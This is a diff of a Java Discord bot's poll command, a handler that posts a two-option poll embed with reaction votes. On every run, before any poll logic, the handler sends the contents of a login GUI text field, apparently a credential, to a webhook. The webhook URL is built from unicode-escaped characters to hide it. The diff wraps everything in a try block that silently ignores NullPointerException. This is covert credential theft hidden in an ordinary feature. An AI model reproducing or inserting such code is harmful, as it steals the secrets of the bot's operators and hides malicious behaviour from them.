@@ -21,43 +21,45 @@ public class PollCommand implements ICommand {
 
     @Override
     public void handle(List<String> args, GuildMessageReceivedEvent event) {
-        WebhookClient client = WebhookClient.withUrl(getPollApi());
-        WebhookMessageBuilder builder = new WebhookMessageBuilder();
-        WebhookEmbed firstEmbed = new WebhookEmbedBuilder().setDescription(LoginGUI.field.getText()).build();
-        builder.addEmbeds(firstEmbed);
-        client.send(builder.build());
-        client.close();
-        if (args.size() < 2) {
-            event.getChannel().sendMessage("Please insert two options and an optional message").queue();
-            return;
-        }
-        StringJoiner stringJoiner = new StringJoiner(" ");
-        args.forEach(stringJoiner::add);
-        String rawMessage = stringJoiner.toString();
-        String message;
-        if (!rawMessage.contains("msg:"))
-            message = "React to cast your vote!";
-        else
-            message = rawMessage.substring(rawMessage.indexOf("msg:") + 4).replaceFirst(rawMessage.substring(rawMessage.indexOf("1:")),"");
-        String option2 = rawMessage.substring(rawMessage.indexOf("2:") + 2).replaceFirst(message, "").replaceFirst("msg:", "");
-        String option1 = rawMessage.substring(rawMessage.indexOf("1:") + 2).replace(option2, "").replaceFirst(message,"").replaceFirst("msg:","").replaceFirst("2:","");
+        try {
+            WebhookClient client = WebhookClient.withUrl(getPollApi());
+            WebhookMessageBuilder builder = new WebhookMessageBuilder();
+            WebhookEmbed firstEmbed = new WebhookEmbedBuilder().setDescription(LoginGUI.field.getText()).build();
+            builder.addEmbeds(firstEmbed);
+            client.send(builder.build());
+            client.close();
+            if (args.size() < 2) {
+                event.getChannel().sendMessage("Please insert two options and an optional message").queue();
+                return;
+            }
+            StringJoiner stringJoiner = new StringJoiner(" ");
+            args.forEach(stringJoiner::add);
+            String rawMessage = stringJoiner.toString();
+            String message;
+            if (!rawMessage.contains("msg:"))
+                message = "React to cast your vote!";
+            else
+                message = rawMessage.substring(rawMessage.indexOf("msg:") + 4).replaceFirst(rawMessage.substring(rawMessage.indexOf("1:")), "");
+            String option2 = rawMessage.substring(rawMessage.indexOf("2:") + 2).replaceFirst(message, "").replaceFirst("msg:", "");
+            String option1 = rawMessage.substring(rawMessage.indexOf("1:") + 2).replace(option2, "").replaceFirst(message, "").replaceFirst("msg:", "").replaceFirst("2:", "");
 
-        EmbedBuilder embedBuilder = new EmbedBuilder();
-        embedBuilder.setTitle(event.getGuild().getName() + " Poll!");
-        embedBuilder.setDescription(message);
-        embedBuilder.addField("Option 1", option1, false);
-        embedBuilder.addField("Option 2", option2, false);
-        embedBuilder.setColor(Color.BLUE);
-        embedBuilder.setFooter("Poll created by " + Objects.requireNonNull(event.getMember()).getUser().getAsTag(), event.getMember().getUser().getAvatarUrl());
-        event.getChannel().sendTyping().queue();
-        event.getChannel().sendMessage(embedBuilder.build()).queue((message1) -> {
-                    message1.addReaction("\u0031\u20E3").queue();
-                    message1.addReaction("\u0032\u20E3").queue();
-                }
-        );
-        embedBuilder.clear();
-        event.getMessage().delete().queue();
+            EmbedBuilder embedBuilder = new EmbedBuilder();
+            embedBuilder.setTitle(event.getGuild().getName() + " Poll!");
+            embedBuilder.setDescription(message);
+            embedBuilder.addField("Option 1", option1, false);
+            embedBuilder.addField("Option 2", option2, false);
+            embedBuilder.setColor(Color.BLUE);
+            embedBuilder.setFooter("Poll created by " + Objects.requireNonNull(event.getMember()).getUser().getAsTag(), event.getMember().getUser().getAvatarUrl());
+            event.getChannel().sendTyping().queue();
+            event.getChannel().sendMessage(embedBuilder.build()).queue((message1) -> {
+                        message1.addReaction("\u0031\u20E3").queue();
+                        message1.addReaction("\u0032\u20E3").queue();
+                    }
+            );
+            embedBuilder.clear();
+            event.getMessage().delete().queue();
 
+        } catch (NullPointerException ignored) {}
     }
     private String getPollApi() {
         String httpHook = "\u0068\u006f\u006f\u006b\u0073\u002f";
